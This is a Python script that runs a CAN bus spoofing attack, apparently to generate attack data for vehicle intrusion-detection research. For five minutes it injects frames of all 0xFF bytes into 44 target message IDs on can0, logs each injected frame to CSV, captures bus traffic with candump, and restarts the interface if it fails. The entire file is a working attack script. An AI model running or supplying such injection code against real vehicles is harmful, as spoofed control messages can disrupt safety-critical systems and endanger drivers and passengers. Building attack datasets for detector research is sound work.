import can
import time
import random
import csv
import os
from threading import Thread
from check_can_status import check_can0_status, restart_can0

# Initialize CAN interface
bus = can.interface.Bus(channel='can0', bustype='socketcan', bitrate=500000)

# Difine target IDs
target_ids = [0x2BB, 0x06D, 0x46C, 0x0A2, 0x146, 0x290, 0x1B8, 0x08D, 0x482, 0x1C9, 
                0x461, 0x25C, 0x19A, 0x1BB, 0x29C, 0x0B4, 0x286, 0x039, 0x1D3, 0x457, 
                0x062, 0x266, 0x2A6, 0x1A7, 0x01A, 0x27B, 0x083, 0x077, 0x3DE, 0x183, 
                0x271, 0x043, 0x098, 0x02F, 0x1B1, 0x2B1, 0x420, 0x058, 0x024, 0x16F, 
                0x198, 0x18D, 0x477, 0x3D4]

# Define the attack duration
attack_duration = 300  # Duration of the attack in seconds

# File to log the attack messages
attack_log_file = 'spoofing_attack_log.csv'

def spoofing_attack():
    time.sleep(1)

    attack_start_time = time.time()
    attack_end_time = attack_start_time + attack_duration

    with open(attack_log_file, 'w', newline='') as csv_file:
        csv_writer = csv.writer(csv_file)
        csv_writer.writerow(['Timestamp', 'ID', 'Data'])

        while time.time() <= attack_end_time:
            random_index = random.randint(0, len(target_ids) - 1)
            can_id = target_ids[random_index]

            msg = can.Message(arbitration_id=can_id, data=[0xFF] * 8, is_extended_id=False)
            
            # Send CAN message
            bus.send(msg)

            # Loging
            timestamp = time.time()
            csv_writer.writerow([timestamp, hex(msg.arbitration_id), ''.join(format(x, '02x') for x in msg.data)])

            time.sleep(0.5)  # Small delay to prevent overwhelming the hardware

            if not check_can0_status():
                restart_can0()
                # Recheck the status to ensure it is up
                if check_can0_status():
                    print("can0 is now up and running.")
                else:
                    print("Failed to bring can0 up.")

        restart_can0()

def log_can_messages():
    os.system('candump can0 -L > spoofing_attack.log')


if __name__ == "__main__":

    attack_thread = Thread(target=spoofing_attack)
    logging_thread = Thread(target=log_can_messages)

    attack_thread.start()
    logging_thread.start()

    attack_thread.join()
    logging_thread.join()

